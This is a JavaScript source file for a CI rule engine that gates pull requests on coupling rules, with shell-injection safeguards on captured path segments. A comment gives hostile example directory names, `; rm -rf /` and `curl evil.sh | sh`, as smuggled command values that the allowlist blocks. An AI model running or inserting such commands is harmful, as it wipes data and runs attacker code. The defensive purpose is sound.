/**
 * Coupling rules: "if these files change, these other things must be true".
 *
 * One manifest covers documentation contracts, schema migrations, prompt evals
 * and dependency decisions, because they are all the same shape. The engine
 * knows nothing about any of them; it only knows the four kinds below.
 *
 * Not every kind carries the same weight, and pretending otherwise is how a
 * rule set turns into theatre:
 *
 *   command  the real gate. Re-runs a generator and compares against what was
 *            committed. Asks whether the file is TRUE, not whether it changed.
 *   added    a real gate. A brand new path has to exist; editing an old file
 *            will not do.
 *   changed  a reminder, not a gate. It is satisfied by typing anything at all.
 *            Worth keeping — it makes an agent open the file — but never rely
 *            on it to prove the content is correct.
 *   label    a human gesture. Deliberate, traceable, and not cryptographic.
 */

import { execFileSync, execSync } from 'node:child_process'
import { added, present, touched } from './changed.mjs'
import { escapeGlob, matchList, substitute, substituteStrict } from './glob.mjs'

/**
 * What a captured path segment must look like before it can be interpolated
 * into a shell string a `command` requirement runs.
 *
 * A capture binds to `[^/]+` (see glob.mjs), and a repository lets a
 * contributor name a directory almost anything — including `; rm -rf /` or
 * `` `curl evil.sh | sh` ``. Quoting does not save you here: backticks and
 * `$(...)` are still expanded by the shell inside double quotes, which is
 * exactly what `JSON.stringify` produces. The fix is not better escaping, it
 * is refusing to run the command at all when a capture falls outside a
 * conservative allowlist of characters no shell gives special meaning to.
 */
const SAFE_CAPTURE = /^[\w.@+-]+$/

/**
 * The first captured value (name and value) that is not safe to interpolate
 * into a shell command, or `null` when every binding is.
 * @param {Record<string,string>} bindings
 * @returns {{ name: string, value: string }|null}
 */
function unsafeCapture(bindings) {
  for (const [name, value] of Object.entries(bindings)) {
    if (!SAFE_CAPTURE.test(value)) return { name, value }
  }
  return null
}

/**
 * @typedef {Object} Requirement
 * @property {'command'|'added'|'changed'|'label'} kind
 * @property {string} [run]        command to execute, for kind `command`
 * @property {string[]} [paths]    path patterns, for kinds `added` and `changed`
 * @property {number} [min]        how many matching paths are needed (default 1)
 * @property {string} [name]       label name, for kind `label`
 * @property {boolean} [rejectWhitespaceOnly] treat a whitespace-only diff as no change
 * @property {string} [fix]        what the agent should do about it
 */

/**
 * @typedef {Object} Rule
 * @property {string} id
 * @property {string[]} when
 * @property {Requirement[]} require
 * @property {string} [why]
 */

/**
 * @typedef {Object} Violation
 * @property {string} ruleId
 * @property {Record<string,string>} bindings
 * @property {string[]} triggeredBy
 * @property {string} required
 * @property {string} [fix]
 * @property {string} [why]
 * @property {string} [detail]
 */

const bindingKey = (b) => JSON.stringify(Object.entries(b).sort())

/**
 * Group the paths that trigger a rule by the captures they resolved to.
 * `src/{module}/**` over three touched modules yields three groups.
 *
 * @param {Rule} rule
 * @param {string[]} paths
 * @returns {Map<string, { bindings: Record<string,string>, paths: string[] }>}
 */
function triggers(rule, paths) {
  const groups = new Map()
  for (const path of paths) {
    const bindings = matchList(rule.when, path)
    if (!bindings) continue
    const key = bindingKey(bindings)
    if (!groups.has(key)) groups.set(key, { bindings, paths: [] })
    groups.get(key).paths.push(path)
  }
  return groups
}

/**
 * Did this path change in a way that is more than whitespace?
 *
 * `--name-only` (even under `-w`) lists a file whenever its blob differs at
 * all, ignore-whitespace or not — it names files, it does not measure diffs.
 * `--numstat` is what actually applies `-w`'s notion of "changed": a file
 * whose only edits are whitespace reports as no lines added or removed, and
 * disappears from the output entirely.
 *
 * `--ignore-blank-lines` alongside it, because `-w` alone still counts an added
 * empty line as a real change — and pressing enter is the cheapest way there is
 * to make a file look edited.
 *
 * Built with `execFileSync` and a real argv, not a shell string: `path` is a
 * captured directory name from the change set, so it is exactly the kind of
 * value a hostile branch controls (see `SAFE_CAPTURE` above). Passing it as
 * an argument rather than interpolating it into a command line means there
 * is no shell here for it to break out of.
 * @param {import('./changed.mjs').Range} range
 */
function changedBeyondWhitespace(range, path) {
  if (!range.base) return true
  try {
    const out = execFileSync(
      'git',
      ['diff', '-w', '--ignore-blank-lines', '--numstat', `${range.base}...${range.head}`, '--', path],
      { encoding: 'utf8' },
    )
    // A mode-only change (chmod +x) still prints a row — "0 0 path" — so the
    // presence of output means the file was mentioned, not that anything in it
    // moved. Read the counts.
    //
    // No `.trim()` / `.filter(Boolean)` here: they used to guard against a
    // leading/trailing blank line, but `Number('') + Number(undefined)` is
    // `NaN`, and `NaN > 0` is already `false` — a blank row reads as "no
    // change" on its own, for free. Removed because dead weight is still
    // weight, not because it was wrong.
    return out
      .split('\n')
      .some((row) => {
        const [addedLines, removedLines] = row.split('\t')
        // A binary file reports "-\t-"; treat that as a real change, since we
        // cannot see inside it to argue otherwise. Written as an `||` over
        // both columns rather than checking just one: `git --numstat` has
        // always emitted the pair together, so no test can force one side to
        // '-' without the other, but the `||` is what stays correct the day
        // that stops being true, and an `&&` here would fail silently instead.
        if (addedLines === '-' || removedLines === '-') return true
        return Number(addedLines) + Number(removedLines) > 0
      })
  } catch {
    return true // Never fail a pull request because the whitespace probe itself broke.
  }
}

/**
 * Evaluate every rule against one range of changes.
 *
 * @param {Object} args
 * @param {Rule[]} args.rules
 * @param {import('./changed.mjs').Change[]} args.changes
 * @param {import('./changed.mjs').Range} args.range
 * @param {string[]} [args.labels]  labels on the pull request, for kind `label`
 * @param {boolean} [args.plan]     report which rules fire without running commands
 * @returns {Violation[]}
 */
export function evaluate({ rules, changes, range, labels = [], plan = false }) {
  const touchedPaths = touched(changes)
  const presentPaths = present(changes)
  const addedPaths = added(changes)
  /** @type {Violation[]} */
  const violations = []

  for (const rule of rules) {
    for (const { bindings, paths } of triggers(rule, touchedPaths).values()) {
      for (const req of rule.require) {
        const base = {
          ruleId: rule.id,
          bindings,
          triggeredBy: paths.slice(0, 5),
          why: rule.why,
          fix: req.fix && substitute(req.fix, bindings),
        }

        if (req.kind === 'label') {
          if (!labels.includes(req.name)) {
            violations.push({ ...base, required: `the label "${req.name}" on the pull request` })
          }
          continue
        }

        if (req.kind === 'command') {
          if (plan) continue // A plan describes what will run; it does not run it.

          // `req.run` is an author-written shell string (it can legitimately use
          // `&&`, pipes, redirection), so unlike the whitespace probe it cannot
          // simply move to execFileSync — the shape genuinely needs a shell.
          // What it must not do is hand that shell a value the change set
          // controls. Refuse the rule rather than run it.
          const bad = unsafeCapture(bindings)
          if (bad) {
            violations.push({
              ...base,
              required: `a capture safe to run in a shell command`,
              detail: `capture "${bad.name}" = ${JSON.stringify(bad.value)} contains a character outside ${SAFE_CAPTURE}; refusing to substitute it into \`${req.run}\``,
            })
            continue
          }

          const run = substitute(req.run, bindings)
          try {
            // `stdio: 'pipe'` is execSync's own default when capturing output,
            // and `encoding: 'utf8'` is redundant with the explicit
            // `.toString()` calls below that decode the buffer regardless —
            // both are written out for a reader, not because a test could ever
            // observe their absence.
            execSync(run, { stdio: 'pipe', encoding: 'utf8' })
          } catch (err) {
            violations.push({
              ...base,
              required: `\`${run}\` to succeed`,
              detail: (err.stderr || err.stdout || '').toString().trim().split('\n').slice(-12).join('\n'),
            })
          }
          continue
        }

        // `substituteStrict`, not `substitute`: this result is re-compiled as a
        // pattern by `matchList` below, so a leftover `{name}` (a rule that
        // references a capture its own `when` never binds) must not be allowed
        // to silently degrade into a wildcard — that is the false reassurance
        // this engine exists to catch, not cause. A rule-authoring mistake
        // reports as a violation naming the problem, not a crash.
        // Values are escaped on the way in for the same reason they are checked
        // before reaching a shell: a capture is a real path segment, so a
        // directory named `evil*` would otherwise arrive as a live wildcard and
        // widen the very requirement it is meant to pin down. The pattern's own
        // globs, written by the rule author, are left intact.
        const safe = Object.fromEntries(Object.entries(bindings).map(([k, v]) => [k, escapeGlob(v)]))
        let wanted
        try {
          wanted = req.paths.map((p) => substituteStrict(p, safe))
        } catch (err) {
          violations.push({ ...base, required: `a well-formed rule`, detail: err.message })
          continue
        }
        const pool = req.kind === 'added' ? addedPaths : presentPaths
        let hits = pool.filter((p) => matchList(wanted, p))

        if (req.kind === 'changed' && req.rejectWhitespaceOnly) {
          hits = hits.filter((p) => changedBeyondWhitespace(range, p))
        }

        const min = req.min ?? 1
        if (hits.length < min) {
          const verb = req.kind === 'added' ? 'a new file matching' : 'a change in'
          violations.push({
            ...base,
            required: `${verb} ${wanted.join(' or ')}${min > 1 ? ` (at least ${min})` : ''}`,
          })
        }
      }
    }
  }

  return violations
}

/**
 * Which rules this set of paths would fire, without running anything.
 * This is what `gate --plan` reports, so an agent learns the cost of a change
 * before writing it rather than after opening a pull request.
 *
 * @param {Rule[]} rules
 * @param {string[]} paths
 */
export function planFor(rules, paths) {
  return rules.flatMap((rule) =>
    [...triggers(rule, paths).values()].map(({ bindings, paths: hit }) => ({
      ruleId: rule.id,
      bindings,
      triggeredBy: hit,
      obligations: rule.require.map((r) =>
        r.kind === 'command'
          ? `run \`${substitute(r.run, bindings)}\``
          : r.kind === 'label'
            ? `the label "${r.name}"`
            : `${r.kind === 'added' ? 'a new file matching' : 'a change in'} ${r.paths
                .map((p) => substitute(p, bindings))
                .join(' or ')}`,
      ),
    })),
  )
}
